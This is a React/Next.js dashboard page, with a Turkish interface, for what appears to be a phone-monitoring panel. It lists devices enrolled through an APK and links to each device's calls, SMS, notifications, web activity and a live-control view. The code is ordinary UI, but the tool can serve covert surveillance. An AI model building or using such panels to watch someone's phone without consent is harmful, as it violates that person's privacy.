'use client';

import { useEffect, useState } from 'react';
import { api, Device, isOnline, formatDate } from '@/lib/api';
import Link from 'next/link';
import { LoadingSkeleton } from '@/components/ui/LoadingSkeleton';
import { PermissionPanel } from '@/components/PermissionPanel';
import { LiveControl } from '@/components/LiveControl';

export default function DashboardPage() {
  const [devices, setDevices] = useState<Device[]>([]);
  const [loading, setLoading] = useState(true);
  const [refreshing, setRefreshing] = useState(false);
  const [error, setError] = useState('');

  const load = async (silent = false) => {
    if (silent) setRefreshing(true);
    else setLoading(true);
    setError('');
    try {
      setDevices(await api.getDevices());
    } catch (e) {
      setError(e instanceof Error ? e.message : 'Yüklenemedi');
    } finally {
      setLoading(false);
      setRefreshing(false);
    }
  };

  useEffect(() => {
    load();
    const t = setInterval(() => load(true), 15_000);
    return () => clearInterval(t);
  }, []);

  return (
    <div className="page-container">
      <div className="page-header">
        <div>
          <h1 className="page-title">Ana Sayfa</h1>
          <p className="page-subtitle">Cihazlar, izinler ve canlı kontrol</p>
        </div>
        <button type="button" onClick={() => load(true)} className="btn-secondary text-sm" disabled={refreshing}>
          {refreshing ? '↻ Güncelleniyor...' : '↻ Yenile'}
        </button>
      </div>

      {error && <div className="error-banner">{error}</div>}
      {loading ? (
        <LoadingSkeleton rows={3} />
      ) : devices.length === 0 ? (
        <div className="empty-state">
          <div className="empty-icon">📱</div>
          <h2>Henüz bağlı cihaz yok</h2>
          <p>APK kurulumunda panel adresi ve bu hesabın e-postasını girin.</p>
        </div>
      ) : (
        <div className="space-y-6">
          {devices.map((device) => (
            <div key={device.id} className="data-card">
              <div className="flex items-start justify-between gap-2 mb-2">
                <div className="min-w-0">
                  <h3 className="font-semibold text-lg truncate">{device.deviceName}</h3>
                  <p className="text-sm text-gray-500">
                    {device.manufacturer && device.model
                      ? `${device.manufacturer} ${device.model}`
                      : 'Model bilgisi bekleniyor'}
                    {' · '}v{device.apkVersion}
                  </p>
                </div>
                <span className={isOnline(device.lastSeen) ? 'badge-green' : 'badge-gray'}>
                  {isOnline(device.lastSeen) ? 'Çevrimiçi' : 'Çevrimdışı'}
                </span>
              </div>
              <p className="text-sm text-gray-500 mb-2">
                Son görülme: {device.lastSeen ? formatDate(device.lastSeen) : 'Hiç'}
              </p>

              <PermissionPanel device={device} />

              <div className="mt-4">
                <LiveControl deviceId={device.id} online={isOnline(device.lastSeen)} />
              </div>

              <div className="grid grid-cols-2 sm:grid-cols-4 gap-2 mt-4">
                <Link href={`/dashboard/calls?device=${device.id}`} className="btn-secondary text-xs text-center">Aramalar</Link>
                <Link href={`/dashboard/sms?device=${device.id}`} className="btn-secondary text-xs text-center">SMS</Link>
                <Link href={`/dashboard/notifications?device=${device.id}`} className="btn-secondary text-xs text-center">Bildirimler</Link>
                <Link href={`/dashboard/web?device=${device.id}`} className="btn-secondary text-xs text-center">İnternet</Link>
              </div>
            </div>
          ))}
        </div>
      )}
    </div>
  );
}
